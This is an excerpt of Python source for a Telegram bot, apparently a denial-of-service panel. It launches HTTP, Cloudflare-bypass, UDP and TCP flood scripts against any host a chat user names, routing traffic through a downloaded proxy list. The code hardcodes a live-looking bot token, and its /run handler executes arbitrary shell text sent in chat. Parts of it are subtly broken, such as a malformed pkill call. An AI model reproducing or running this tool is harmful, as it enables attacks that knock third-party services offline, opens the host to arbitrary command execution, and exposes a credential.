...
bot_token = '6486027023:AAGxEZ04zhdKgqV4hDfjIz8Qts2NXXz7Y1k'
...
def run_handler(message):
    bash_shell = ' '.join(message.text.split()[1:])
    subprocess.Popen(['screen', '-dm', bash_shell])

@bot.message_handler(commands=['stop'])
def stop_handler(message):
    subprocess.Popen('pkill', '-f', message.from_user.id)
...
def getproxy_handler(message):
    command = ["wget", "https://openproxylist.xyz/http.txt"]
    result = subprocess.run(command, capture_output=True, text=True, check=True)
    output = result.stdout
    bot.reply_to(message, 'Get proxy thành công!')
...
def attack_command(message):
    ...
    if method in ['HTTP-LOAD', 'CF-BYPASS', 'UDP-FLOOD', 'TCP-FLOOD', 'FLOOD', 'TON']:
        # Update the command and duration based on the selected method
        if method == 'TON':
            command = ["node", "ton", host, attacktime, "64", "4", "http.txt", "http", str(message.from_user.id)]
            duration = 120
        if method == 'HTTP-LOAD':
            command = ["node", "http", host, "120", "64", "8", "http.txt", str(message.from_user.id)]
            duration = 120
        elif method == 'CF-BYPASS':
            command = ["node", "CFBYPASS.js", host, "120", "64", "8", "http.txt", str(message.from_user.id)]
            duration = 120
        elif method == 'FLOOD':
            command = ["node", "flood.js", host, "120", "8", "http.txt", "64", "15", str(message.from_user.id)]
            duration = 120
        elif method == 'UDP-FLOOD':
            if not port.isdigit():
                bot.reply_to(message, 'Port phải là một số nguyên dương.')
                return
            command = ["python", "udp.py", host, port, "120", "64", "35", str(message.from_user.id)]
            duration = 120
        elif method == 'TCP-FLOOD':
            if not port.isdigit():
                bot.reply_to(message, 'Port phải là một số nguyên dương.')
                return
            command = ["python", "tcp.py", host, port, "120", "64", "35", str(message.from_user.id)]
            duration = 120
